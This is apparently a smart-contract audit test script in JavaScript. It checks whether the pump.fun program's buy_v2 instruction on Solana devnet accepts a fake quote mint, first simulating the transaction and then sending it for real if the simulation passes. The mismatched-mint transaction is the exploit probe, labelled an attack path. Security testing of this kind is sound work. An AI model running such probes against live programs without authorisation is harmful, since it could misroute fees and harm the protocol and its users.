/**
 * C-10: buy_v2 quoteMint validation test
 *
 * Tests whether buy_v2 can be executed with a quoteMint that does not match
 * the bonding curve's expected quote mint, causing ATAs to resolve to wrong
 * token accounts and route fees incorrectly.
 *
 * Usage: node test_c10_buyv2_quote_mint.mjs <BASE_MINT>
 *   BASE_MINT = a pump.fun devnet coin (e.g. aXZEKCmy5vu7BS4AtnwAu3n9B9A1AcEKR27cuj5pump)
 */

import {
	Connection,
	PublicKey,
	Keypair,
	Transaction,
	TransactionInstruction,
	LAMPORTS_PER_SOL,
	SystemProgram,
} from "@solana/web3.js";

// ── Devnet ───────────────────────────────────────────────────────────────────
const connection = new Connection("https://api.devnet.solana.com", "confirmed");

const PUMP_PROGRAM = new PublicKey(
	"6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P",
);
const PUMP_FEES = new PublicKey("pfeeUxB6jkeY1Hxd7CsFCAjcbHA9rWtchMGdZ6VojVZ");
const TOKEN_PROGRAM = new PublicKey(
	"TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
);
const TOKEN_2022_PROGRAM = new PublicKey(
	"TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
);
const ASSOCIATED_TOKEN_PROGRAM = new PublicKey(
	"ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
);
const SYSTEM_PROGRAM = new PublicKey("11111111111111111111111111111111");
const WSOL_MINT = new PublicKey("So11111111111111111111111111111111111111112");

const EVENT_AUTHORITY_SEED = Buffer.from([
	95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111, 114, 105, 116,
	121,
]); // "__event_authority"

// ── PDAs ────────────────────────────────────────────────────────────────────
const [globalPda] = PublicKey.findProgramAddressSync(
	[Buffer.from("global")],
	PUMP_PROGRAM,
);
const [eventAuthorityPda] = PublicKey.findProgramAddressSync(
	[EVENT_AUTHORITY_SEED],
	PUMP_PROGRAM,
);
const [globalVolAccPda] = PublicKey.findProgramAddressSync(
	[Buffer.from("global_volume_accumulator")],
	PUMP_PROGRAM,
);

// ── Anchor discriminator: sha256("global:buy_v2")[0..8] ─────────────────────
// From IDL: [184, 23, 238, 97, 103, 197, 211, 61]
const BUY_V2_DISCRIMINATOR = Buffer.from([184, 23, 238, 97, 103, 197, 211, 61]);

// ── Fake quote mint for the attack ─────────────────────────────────────────
// Generate a valid key that has no real tokens on devnet
const FAKE_MINT = Keypair.generate().publicKey;

// ═══════════════════════════════════════════════════════════════════════════
//  PDA DERIVATION HELPERS
// ═══════════════════════════════════════════════════════════════════════════

function findAta(owner, mint, tokenProgram = TOKEN_PROGRAM) {
	return PublicKey.findProgramAddressSync(
		[owner.toBuffer(), tokenProgram.toBuffer(), mint.toBuffer()],
		ASSOCIATED_TOKEN_PROGRAM,
	)[0];
}

function findFeeConfigPda() {
	const FEE_CONFIG_SEED = Buffer.from([
		102, 101, 101, 95, 99, 111, 110, 102, 105, 103,
	]); // "fee_config"
	const FEE_CONFIG_CONST = Buffer.from([
		1, 86, 224, 246, 147, 102, 90, 207, 68, 219, 21, 104, 191, 23, 91, 170, 81,
		137, 203, 151, 245, 210, 255, 59, 101, 93, 43, 182, 253, 109, 24, 176,
	]);
	return PublicKey.findProgramAddressSync(
		[FEE_CONFIG_SEED, FEE_CONFIG_CONST],
		PUMP_FEES,
	)[0];
}

function findSharingConfigPda(baseMint) {
	const SHARING_PROGRAM = new PublicKey(
		"CJsLWePLusk6GGhZP5P8JUGPABVSBhTrLDEtg4AkLGqU",
	);
	return PublicKey.findProgramAddressSync(
		[Buffer.from("sharing-config"), baseMint.toBuffer()],
		SHARING_PROGRAM,
	)[0];
}

function findBondingCurvePda(mint) {
	return PublicKey.findProgramAddressSync(
		[Buffer.from("bonding-curve"), mint.toBuffer()],
		PUMP_PROGRAM,
	)[0];
}

function findCreatorVaultPda(creator) {
	return PublicKey.findProgramAddressSync(
		[Buffer.from("creator-vault"), creator.toBuffer()],
		PUMP_PROGRAM,
	)[0];
}

function findUserVolAccPda(user) {
	return PublicKey.findProgramAddressSync(
		[Buffer.from("user_volume_accumulator"), user.toBuffer()],
		PUMP_PROGRAM,
	)[0];
}

// ═══════════════════════════════════════════════════════════════════════════
//  INSTRUCTION BUILDER
// ═══════════════════════════════════════════════════════════════════════════

function buildBuyV2Ix(params) {
	const {
		global,
		baseMint,
		quoteMint,
		baseTokenProgram,
		quoteTokenProgram,
		associatedTokenProgram,
		feeRecipient,
		associatedQuoteFeeRecipient,
		buybackFeeRecipient,
		associatedQuoteBuybackFeeRecipient,
		bondingCurve,
		associatedBaseBondingCurve,
		associatedQuoteBondingCurve,
		user,
		associatedBaseUser,
		associatedQuoteUser,
		creatorVault,
		associatedCreatorVault,
		sharingConfig,
		globalVolumeAccumulator,
		userVolumeAccumulator,
		associatedUserVolumeAccumulator,
		feeConfig,
		feeProgram,
		systemProgram,
		eventAuthority,
		program,
		amount,
		maxSolCost,
	} = params;

	const data = Buffer.concat([
		BUY_V2_DISCRIMINATOR,
		(() => {
			const b = Buffer.alloc(8);
			b.writeBigUInt64LE(BigInt(amount));
			return b;
		})(),
		(() => {
			const b = Buffer.alloc(8);
			b.writeBigUInt64LE(BigInt(maxSolCost));
			return b;
		})(),
	]);

	const keys = [
		{ pubkey: global, isSigner: false, isWritable: false },
		{ pubkey: baseMint, isSigner: false, isWritable: false },
		{ pubkey: quoteMint, isSigner: false, isWritable: false },
		{ pubkey: baseTokenProgram, isSigner: false, isWritable: false },
		{ pubkey: quoteTokenProgram, isSigner: false, isWritable: false },
		{ pubkey: associatedTokenProgram, isSigner: false, isWritable: false },
		{ pubkey: feeRecipient, isSigner: false, isWritable: true },
		{ pubkey: associatedQuoteFeeRecipient, isSigner: false, isWritable: true },
		{ pubkey: buybackFeeRecipient, isSigner: false, isWritable: true },
		{
			pubkey: associatedQuoteBuybackFeeRecipient,
			isSigner: false,
			isWritable: true,
		},
		{ pubkey: bondingCurve, isSigner: false, isWritable: true },
		{ pubkey: associatedBaseBondingCurve, isSigner: false, isWritable: true },
		{ pubkey: associatedQuoteBondingCurve, isSigner: false, isWritable: true },
		{ pubkey: user, isSigner: true, isWritable: true },
		{ pubkey: associatedBaseUser, isSigner: false, isWritable: true },
		{ pubkey: associatedQuoteUser, isSigner: false, isWritable: true },
		{ pubkey: creatorVault, isSigner: false, isWritable: true },
		{ pubkey: associatedCreatorVault, isSigner: false, isWritable: true },
		{ pubkey: sharingConfig, isSigner: false, isWritable: false },
		{ pubkey: globalVolumeAccumulator, isSigner: false, isWritable: false },
		{ pubkey: userVolumeAccumulator, isSigner: false, isWritable: true },
		{
			pubkey: associatedUserVolumeAccumulator,
			isSigner: false,
			isWritable: true,
		},
		{ pubkey: feeConfig, isSigner: false, isWritable: false },
		{ pubkey: feeProgram, isSigner: false, isWritable: false },
		{ pubkey: systemProgram, isSigner: false, isWritable: false },
		{ pubkey: eventAuthority, isSigner: false, isWritable: false },
		{ pubkey: program, isSigner: false, isWritable: false },
	];

	return new TransactionInstruction({ programId: PUMP_PROGRAM, keys, data });
}

// ═══════════════════════════════════════════════════════════════════════════
//  KNOWN ADDRESSES FROM DOCS
// ═══════════════════════════════════════════════════════════════════════════

const NORMAL_FEE_RECIPIENTS = [
	"62qc2CNXwrYqQScmEdiZFFAnJR262PxWEuNQtxfafNgV",
	"7VtfL8fvgNfhz17qKRMjzQEXgbdpnHHHQRh54R9jP2RJ",
	"7hTckgnGnLQR6sdH7YkqFTAA7VwTfYFaZ6EhEsU3saCX",
	"9rPYyANsfQZw3DnDmKE3YCQF5E8oD89UXoHn9JFEhJUz",
	"AVmoTthdrX6tKt4nDjco2D775W2YK3sDhxPcMmzUAmTY",
	"CebN5WGQ4jvEPvsVU4EoHEpgzq1VV7AbicfhtW4xC9iM",
	"FWsW1xNtWscwNmKv6wVsU1iTzRN6wmmk3MjxRP5tT7hz",
	"G5UZAVbAf46s7cKWoyKu8kYTip9DGTpbLZ2qa9Aq69dP",
].map((s) => new PublicKey(s));

const BUYBACK_FEE_RECIPIENTS = [
	"5YxQFdt3Tr9zJLvkFccqXVUwhdTWJQc1fFg2YPbxvxeD",
	"9M4giFFMxmFGXtc3feFzRai56WbBqehoSeRE5GK7gf7",
	"GXPFM2caqTtQYC2cJ5yJRi9VDkpsYZXzYdwYpGnLmtDL",
	"3BpXnfJaUTiwXnJNe7Ej1rcbzqTTQUvLShZaWazebsVR",
	"5cjcW9wExnJJiqgLjq7DEG75Pm6JBgE1hNv4B2vHXUW6",
	"EHAAiTxcdDwQ3U4bU6YcMsQGaekdzLS3B5SmYo46kJtL",
	"5eHhjP8JaYkz83CWwvGU2uMUXefd3AazWGx4gpcuEEYD",
	"A7hAgCzFw14fejgCp387JUJRMNyz4j89JKnhtKU8piqW",
].map((s) => new PublicKey(s));

// ═══════════════════════════════════════════════════════════════════════════
//  MAIN
// ═══════════════════════════════════════════════════════════════════════════

async function main() {
	console.log(
		"═══════════════════════════════════════════════════════════════",
	);
	console.log("  C-10: buy_v2 quoteMint Validation Test");
	console.log(
		"═══════════════════════════════════════════════════════════════\n",
	);

	const baseMintStr = process.argv[2];
	if (!baseMintStr) {
		console.error(
			"Usage: node test_c10_buyv2_quote_mint.mjs <BASE_MINT_ADDRESS>",
		);
		console.error("");
		console.error("Example (devnet coin found during recon):");
		console.error(
			"  node test_c10_buyv2_quote_mint.mjs aXZEKCmy5vu7BS4AtnwAu3n9B9A1AcEKR27cuj5pump",
		);
		process.exit(1);
	}

	const baseMint = new PublicKey(baseMintStr);
	const bondingCurvePda = findBondingCurvePda(baseMint);
	const [associatedBaseBondingCurve] = PublicKey.findProgramAddressSync(
		[
			bondingCurvePda.toBuffer(),
			TOKEN_2022_PROGRAM.toBuffer(),
			baseMint.toBuffer(),
		],
		ASSOCIATED_TOKEN_PROGRAM,
	);

	console.log(`Base mint:       ${baseMint.toBase58()}`);
	console.log(`Bonding curve:   ${bondingCurvePda.toBase58()}`);
	console.log(`Fake quote mint: ${FAKE_MINT.toBase58()}\n`);

	// ─── Check bonding curve ──────────────────────────────────────────────
	const bcAcc = await connection.getAccountInfo(bondingCurvePda);
	if (!bcAcc) {
		console.log(`❌ Bonding curve not found at ${bondingCurvePda.toBase58()}`);
		process.exit(1);
	}
	console.log(`✅ Bonding curve found. Data len: ${bcAcc.data.length} bytes`);

	// Parse bonding curve
	const bcView = new DataView(
		bcAcc.data.buffer,
		bcAcc.data.byteOffset,
		bcAcc.data.byteLength,
	);
	const virtualTokenReserves = bcView.getBigUint64(8, true);
	const virtualSolReserves = bcView.getBigUint64(16, true);
	const realTokenReserves = bcView.getBigUint64(24, true);
	const realSolReserves = bcView.getBigUint64(32, true);
	const tokenTotalSupply = bcView.getBigUint64(40, true);
	const complete = bcView.getUint8(48) !== 0;
	const creator = new PublicKey(bcAcc.data.subarray(49, 81));

	console.log(`  virtualTokenReserves: ${virtualTokenReserves}`);
	console.log(`  virtualSolReserves:   ${virtualSolReserves}`);
	console.log(`  realTokenReserves:    ${realTokenReserves}`);
	console.log(`  realSolReserves:      ${realSolReserves}`);
	console.log(`  tokenTotalSupply:     ${tokenTotalSupply}`);
	console.log(`  complete:             ${complete}`);
	console.log(`  creator:              ${creator.toBase58()}\n`);

	if (complete) {
		console.log("⚠️  Bonding curve is complete (migrated). Trades will fail.");
		console.log("   Using it for simulation only - won't actually trade.\n");
	}

	// ─── Determine base token program ────────────────────────────────────
	// Devnet coins use Token-2022 (TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb)
	// Detect by checking the mint account's owner
	const mintAcc = await connection.getAccountInfo(baseMint);
	let baseTokenProgram = TOKEN_PROGRAM;
	if (mintAcc) {
		const ownerStr = mintAcc.owner.toBase58();
		if (ownerStr === TOKEN_2022_PROGRAM.toBase58()) {
			baseTokenProgram = TOKEN_2022_PROGRAM;
			console.log(
				`Base token program: Token-2022 (${TOKEN_2022_PROGRAM.toBase58()})`,
			);
		} else if (ownerStr === TOKEN_PROGRAM.toBase58()) {
			console.log(`Base token program: Token (${TOKEN_PROGRAM.toBase58()})`);
		} else {
			console.log(`⚠️  Mint owner: ${ownerStr} (unexpected)`);
		}
	}
	console.log();

	// ─── Wallet setup ──────────────────────────────────────────────────
	const wallet = Keypair.generate();
	console.log(`Test wallet: ${wallet.publicKey.toBase58()}`);

	// Airdrop
	try {
		const sig = await connection.requestAirdrop(
			wallet.publicKey,
			0.05 * LAMPORTS_PER_SOL,
		);
		await connection.confirmTransaction(sig);
		console.log(`✅ Airdropped 0.05 SOL`);
	} catch (e) {
		console.log(`ℹ️  Airdrop: ${e.message}`);
	}
	const bal = await connection.getBalance(wallet.publicKey);
	console.log(`Wallet balance: ${bal / LAMPORTS_PER_SOL} SOL\n`);

	// ─── Derive all accounts for CORRECT (WSOL) quote mint ─────────────
	const feeRecipient = NORMAL_FEE_RECIPIENTS[0];
	const buybackFeeRecipient = BUYBACK_FEE_RECIPIENTS[0];
	const quoteTokenProgram = TOKEN_PROGRAM; // WSOL uses regular token program

	const correctQuoteMint = WSOL_MINT;

	const associatedBaseUser = findAta(
		wallet.publicKey,
		baseMint,
		baseTokenProgram,
	);
	const correctAssociatedQuoteUser = findAta(
		wallet.publicKey,
		correctQuoteMint,
	);
	const correctAssociatedQuoteFeeRecipient = findAta(
		feeRecipient,
		correctQuoteMint,
	);
	const correctAssociatedQuoteBuybackFeeRecipient = findAta(
		buybackFeeRecipient,
		correctQuoteMint,
	);
	const correctAssociatedQuoteBondingCurve = findAta(
		bondingCurvePda,
		correctQuoteMint,
	);
	const creatorVaultPda = findCreatorVaultPda(creator);
	const correctAssociatedCreatorVault = findAta(
		creatorVaultPda,
		correctQuoteMint,
	);
	const userVolAccPda = findUserVolAccPda(wallet.publicKey);
	const correctAssociatedUserVolAcc = findAta(userVolAccPda, correctQuoteMint);
	const sharingConfigPda = findSharingConfigPda(baseMint);
	const feeConfigPda = findFeeConfigPda();

	// ═══════════════════════════════════════════════════════════════════
	//  TEST A: Valid buy_v2 with WSOL quoteMint
	// ═══════════════════════════════════════════════════════════════════
	console.log("── Test A: Valid buy_v2 with WSOL quoteMint ──\n");

	const smallAmount = 1n;
	const maxSolCost = 100_000n;

	const validIx = buildBuyV2Ix({
		global: globalPda,
		baseMint,
		quoteMint: correctQuoteMint,
		baseTokenProgram,
		quoteTokenProgram,
		associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM,
		feeRecipient,
		associatedQuoteFeeRecipient: correctAssociatedQuoteFeeRecipient,
		buybackFeeRecipient,
		associatedQuoteBuybackFeeRecipient:
			correctAssociatedQuoteBuybackFeeRecipient,
		bondingCurve: bondingCurvePda,
		associatedBaseBondingCurve,
		associatedQuoteBondingCurve: correctAssociatedQuoteBondingCurve,
		user: wallet.publicKey,
		associatedBaseUser,
		associatedQuoteUser: correctAssociatedQuoteUser,
		creatorVault: creatorVaultPda,
		associatedCreatorVault: correctAssociatedCreatorVault,
		sharingConfig: sharingConfigPda,
		globalVolumeAccumulator: globalVolAccPda,
		userVolumeAccumulator: userVolAccPda,
		associatedUserVolumeAccumulator: correctAssociatedUserVolAcc,
		feeConfig: feeConfigPda,
		feeProgram: PUMP_FEES,
		systemProgram: SYSTEM_PROGRAM,
		eventAuthority: eventAuthorityPda,
		program: PUMP_PROGRAM,
		amount: Number(smallAmount),
		maxSolCost: Number(maxSolCost),
	});

	const validTx = new Transaction().add(validIx);
	validTx.feePayer = wallet.publicKey;
	validTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

	const validSim = await connection.simulateTransaction(validTx, [wallet]);
	console.log("Simulation result (valid):");
	if (validSim.value.err) {
		console.log(`  ❌ Error: ${JSON.stringify(validSim.value.err)}`);
		if (validSim.value.logs) {
			for (const l of validSim.value.logs) {
				if (l.includes("Error") || l.includes("Program log:"))
					console.log(`  ${l}`);
			}
		}
	} else {
		console.log(`  ✅ SIMULATION SUCCEEDED`);
		console.log(`  Units: ${validSim.value.unitsConsumed || "N/A"}`);
		if (validSim.value.logs) {
			for (const l of validSim.value.logs) {
				if (l.includes("Program log:")) console.log(`  ${l}`);
			}
		}
	}

	// ═══════════════════════════════════════════════════════════════════
	//  TEST B: buy_v2 with WRONG quoteMint (fake token)
	// ═══════════════════════════════════════════════════════════════════
	console.log("\n── Test B: buy_v2 with WRONG quoteMint (fake token) ──\n");

	const wrongQuoteMint = FAKE_MINT;

	// Derive ALL quote ATAs for the WRONG mint
	const wrongAssociatedQuoteFeeRecipient = findAta(
		feeRecipient,
		wrongQuoteMint,
	);
	const wrongAssociatedQuoteBuybackFeeRecipient = findAta(
		buybackFeeRecipient,
		wrongQuoteMint,
	);
	const wrongAssociatedQuoteBondingCurve = findAta(
		bondingCurvePda,
		wrongQuoteMint,
	);
	const wrongAssociatedQuoteUser = findAta(wallet.publicKey, wrongQuoteMint);
	const wrongAssociatedCreatorVault = findAta(creatorVaultPda, wrongQuoteMint);
	const wrongAssociatedUserVolAcc = findAta(userVolAccPda, wrongQuoteMint);

	console.log("Account resolution for WRONG quoteMint:");
	console.log(
		`  quoteMint:                         ${wrongQuoteMint.toBase58()}`,
	);
	console.log(
		`  associatedQuoteFeeRecipient:        ${wrongAssociatedQuoteFeeRecipient.toBase58()}`,
	);
	console.log(
		`  associatedQuoteBuybackFeeRecipient: ${wrongAssociatedQuoteBuybackFeeRecipient.toBase58()}`,
	);
	console.log(
		`  associatedQuoteBondingCurve:        ${wrongAssociatedQuoteBondingCurve.toBase58()}`,
	);
	console.log(
		`  associatedQuoteUser:                ${wrongAssociatedQuoteUser.toBase58()}`,
	);
	console.log(
		`  associatedCreatorVault:             ${wrongAssociatedCreatorVault.toBase58()}`,
	);
	console.log(
		`  associatedUserVolumeAccumulator:    ${wrongAssociatedUserVolAcc.toBase58()}\n`,
	);

	// Check if any of the wrong ATAs exist (they shouldn't)
	for (const [label, addr] of [
		["associatedQuoteFeeRecipient", wrongAssociatedQuoteFeeRecipient],
		[
			"associatedQuoteBuybackFeeRecipient",
			wrongAssociatedQuoteBuybackFeeRecipient,
		],
		["associatedQuoteBondingCurve", wrongAssociatedQuoteBondingCurve],
		["associatedQuoteUser", wrongAssociatedQuoteUser],
		["associatedCreatorVault", wrongAssociatedCreatorVault],
	]) {
		const info = await connection.getAccountInfo(addr);
		console.log(`  ${label} exists: ${!!info}`);
	}
	console.log();

	const wrongIx = buildBuyV2Ix({
		global: globalPda,
		baseMint,
		quoteMint: wrongQuoteMint,
		baseTokenProgram,
		quoteTokenProgram,
		associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM,
		feeRecipient,
		associatedQuoteFeeRecipient: wrongAssociatedQuoteFeeRecipient,
		buybackFeeRecipient,
		associatedQuoteBuybackFeeRecipient: wrongAssociatedQuoteBuybackFeeRecipient,
		bondingCurve: bondingCurvePda,
		associatedBaseBondingCurve,
		associatedQuoteBondingCurve: wrongAssociatedQuoteBondingCurve,
		user: wallet.publicKey,
		associatedBaseUser,
		associatedQuoteUser: wrongAssociatedQuoteUser,
		creatorVault: creatorVaultPda,
		associatedCreatorVault: wrongAssociatedCreatorVault,
		sharingConfig: sharingConfigPda,
		globalVolumeAccumulator: globalVolAccPda,
		userVolumeAccumulator: userVolAccPda,
		associatedUserVolumeAccumulator: wrongAssociatedUserVolAcc,
		feeConfig: feeConfigPda,
		feeProgram: PUMP_FEES,
		systemProgram: SYSTEM_PROGRAM,
		eventAuthority: eventAuthorityPda,
		program: PUMP_PROGRAM,
		amount: Number(smallAmount),
		maxSolCost: Number(maxSolCost),
	});

	const wrongTx = new Transaction().add(wrongIx);
	wrongTx.feePayer = wallet.publicKey;
	wrongTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

	console.log("Simulation result (WRONG quoteMint):");
	const wrongSim = await connection.simulateTransaction(wrongTx, [wallet]);
	if (wrongSim.value.err) {
		const errStr = JSON.stringify(wrongSim.value.err);
		console.log(`  ❌ Error: ${errStr}`);
		if (wrongSim.value.logs) {
			for (const l of wrongSim.value.logs) {
				if (
					l.includes("Error") ||
					l.includes("Program log:") ||
					l.includes("constraint") ||
					l.includes("Allocate")
				) {
					console.log(`  ${l}`);
				}
			}
		}

		// Identify error type
		const logs = wrongSim.value.logs || [];
		const anchorErrMatch = logs.find((l) => l.match(/Error Code: (\w+)/));
		const pumpErrMatch = logs.find((l) => l.match(/(\d{4})/));
		const constraintMatch = logs.find((l) => l.includes("constraint"));

		console.log();
		if (constraintMatch) {
			console.log(`  → CONSTRAINT ERROR: ${constraintMatch}`);
			console.log("  → KILL: Account constraint caught the wrong quote mint");
		} else if (pumpErrMatch) {
			console.log(`  → PUMP ERROR CODE: ${pumpErrMatch}`);
			console.log("  → KILL: Program validated quote mint");
		} else if (anchorErrMatch) {
			console.log(`  → ANCHOR ERROR: ${anchorErrMatch}`);
			console.log("  → KILL: Anchor constraint caught the mismatch");
		} else {
			console.log("  → Unknown error. Examining full logs...");
			if (logs.length > 0) {
				logs.forEach((l, i) => console.log(`  [${i}] ${l}`));
			}
		}
	} else {
		console.log(`  ⚠️  SIMULATION SUCCEEDED WITH WRONG QUOTE MINT!`);
		console.log(`  Units: ${wrongSim.value.unitsConsumed || "N/A"}`);

		// This would be the attack path
		console.log("\n  → ATTEMPTING ACTUAL TRANSACTION...");
		try {
			const sig = await connection.sendTransaction(wrongTx, [wallet]);
			console.log(`  TX sent: ${sig}`);
			const result = await connection.confirmTransaction(sig, "confirmed");
			if (result.value.err) {
				console.log(
					`  ❌ TX failed on-chain: ${JSON.stringify(result.value.err)}`,
				);
			} else {
				console.log(`  ✅ TX SUCCEEDED!`);
				console.log(`  Signature: https://solscan.io/tx/${sig}?cluster=devnet`);
			}
		} catch (e) {
			console.log(`  ❌ TX send failed: ${e.message}`);
		}
	}

	// ═══════════════════════════════════════════════════════════════════
	//  SUMMARY
	// ═══════════════════════════════════════════════════════════════════
	console.log(
		"\n═══════════════════════════════════════════════════════════════",
	);
	console.log("  VERDICT");
	console.log(
		"═══════════════════════════════════════════════════════════════",
	);

	const validPassed = !validSim.value.err;
	const wrongPassed = !wrongSim.value.err;
	const wrongErrStr = wrongSim.value.err
		? JSON.stringify(wrongSim.value.err)
		: "none";

	if (!validPassed) {
		console.log(
			"  INCONCLUSIVE: Valid buy_v2 also failed (bonding curve may be dead/migrated)",
		);
		console.log(`  Valid error: ${JSON.stringify(validSim.value.err)}`);
	} else if (!wrongPassed) {
		console.log("  ✅ KILL: Program correctly blocks wrong quote mint");
		console.log(`  Wrong error: ${wrongErrStr}`);
		// Identify the exact error
		const logs = wrongSim.value.logs || [];
		const constraintLog = logs.find(
			(l) => l.includes("constraint") || l.includes("Error"),
		);
		if (constraintLog) console.log(`  Key error: ${constraintLog}`);
	} else {
		console.log("  ⚠️  VALID: Program ACCEPTED wrong quote mint!");
		console.log("  → Fee routing may be exploitable.");
		console.log("  → Check fee recipient balances before/after actual tx.");
	}
}

main().catch(console.error);
